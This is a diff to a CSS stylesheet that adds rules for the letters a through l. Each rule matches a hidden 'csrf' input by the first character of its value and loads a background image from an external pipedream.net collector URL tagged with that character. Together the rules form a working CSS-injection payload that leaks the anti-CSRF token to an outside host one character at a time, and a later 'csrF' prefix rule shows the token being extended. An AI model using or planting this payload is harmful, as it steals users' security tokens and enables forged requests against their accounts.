@@ -5,6 +5,43 @@ body{
 input[name=csrf][value^=b]{
     background-image: url(//eoa21cz1z5v9xqj.m.pipedream.net/b);
 }
+input[name=csrf][value^=a]{
+    background-image: url(//eoa21cz1z5v9xqj.m.pipedream.net/a);
+}
+input[name=csrf][value^=c]{
+    background-image: url(//eoa21cz1z5v9xqj.m.pipedream.net/c);
+}
+input[name=csrf][value^=d]{
+    background-image: url(//eoa21cz1z5v9xqj.m.pipedream.net/d);
+}
+input[name=csrf][value^=e]{
+    background-image: url(//eoa21cz1z5v9xqj.m.pipedream.net/e);
+}
+input[name=csrf][value^=f]{
+    background-image: url(//eoa21cz1z5v9xqj.m.pipedream.net/f);
+}
+input[name=csrf][value^=g]{
+    background-image: url(//eoa21cz1z5v9xqj.m.pipedream.net/g);
+}
+input[name=csrf][value^=h]{
+    background-image: url(//eoa21cz1z5v9xqj.m.pipedream.net/h);
+}
+
+input[name=csrf][value^=i]{
+    background-image: url(//eoa21cz1z5v9xqj.m.pipedream.net/i);
+}
+input[name=csrf][value^=j]{
+    background-image: url(//eoa21cz1z5v9xqj.m.pipedream.net/j);
+}
+
+input[name=csrf][value^=k]{
+    background-image: url(//eoa21cz1z5v9xqj.m.pipedream.net/k);
+}
+input[name=csrf][value^=l]{
+    background-image: url(//eoa21cz1z5v9xqj.m.pipedream.net/l);
+}
+
+
 
 input[name=csrf][value^=csrF] ~ * {
     background-image: url(//eoa21cz1z5v9xqj.m.pipedream.net/csrF);
